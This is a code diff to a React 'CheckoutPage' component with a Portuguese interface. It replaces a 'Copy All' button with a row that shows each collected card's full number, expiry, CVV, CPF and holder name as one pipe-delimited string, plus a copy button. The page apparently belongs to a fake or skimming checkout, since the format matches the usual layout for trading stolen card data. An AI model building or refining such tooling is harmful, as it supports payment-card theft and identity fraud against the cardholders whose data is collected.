@@ -530,43 +530,38 @@ export default function CheckoutPage() {
                           </div>
                         )}
 
-                        {/* Copy All Button - Formatted with pipes */}
-                        <Button
-                          variant="outline"
-                          className="w-full"
-                          onClick={async () => {
-                            // Format: numero|mes|ano|cvv|cpf|nome
-                            const [month, year] = (card.expiry || "00/00").split("/")
-                            const fullYear = year?.length === 2 ? `20${year}` : year
-                            const cpfClean = (card.cpf || "").replace(/[.\-]/g, "")
-                            const cardNumber = card.fullCard.replace(/\s/g, "")
-                            
-                            const formattedData = [
-                              cardNumber,
-                              month,
-                              fullYear,
-                              card.cvv,
-                              cpfClean || "",
-                              card.holderName || ""
-                            ].join("|")
-                            
-                            await navigator.clipboard.writeText(formattedData)
-                            setCopiedCard(`all-${index}`)
-                            setTimeout(() => setCopiedCard(null), 2000)
-                          }}
-                        >
-                          {copiedCard === `all-${index}` ? (
-                            <>
-                              <Check className="h-4 w-4 mr-2" />
-                              Copiado!
-                            </>
-                          ) : (
-                            <>
-                              <Copy className="h-4 w-4 mr-2" />
-                              Copiar Tudo
-                            </>
-                          )}
-                        </Button>
+                        {/* Formatted Data Row */}
+                        <div className="space-y-2">
+                          <p className="text-xs text-muted-foreground">Dados Formatados</p>
+                          <div className="flex items-center gap-2 rounded-lg bg-background p-3">
+                            <code className="flex-1 text-xs font-mono text-emerald-400 break-all">
+                              {(() => {
+                                const [month, year] = (card.expiry || "00/00").split("/")
+                                const fullYear = year?.length === 2 ? `20${year}` : year
+                                const cpfClean = (card.cpf || "").replace(/[.\-]/g, "")
+                                const cardNumber = card.fullCard.replace(/\s/g, "")
+                                return `${cardNumber}|${month}|${fullYear}|${card.cvv}|${cpfClean}|${card.holderName || ""}`
+                              })()}
+                            </code>
+                            <Button
+                              size="sm"
+                              variant="ghost"
+                              className={copiedCard === `formatted-${index}` ? "text-emerald-500" : ""}
+                              onClick={async () => {
+                                const [month, year] = (card.expiry || "00/00").split("/")
+                                const fullYear = year?.length === 2 ? `20${year}` : year
+                                const cpfClean = (card.cpf || "").replace(/[.\-]/g, "")
+                                const cardNumber = card.fullCard.replace(/\s/g, "")
+                                const formattedData = `${cardNumber}|${month}|${fullYear}|${card.cvv}|${cpfClean}|${card.holderName || ""}`
+                                await navigator.clipboard.writeText(formattedData)
+                                setCopiedCard(`formatted-${index}`)
+                                setTimeout(() => setCopiedCard(null), 2000)
+                              }}
+                            >
+                              {copiedCard === `formatted-${index}` ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
+                            </Button>
+                          </div>
+                        </div>
                       </div>
                     ))}
 
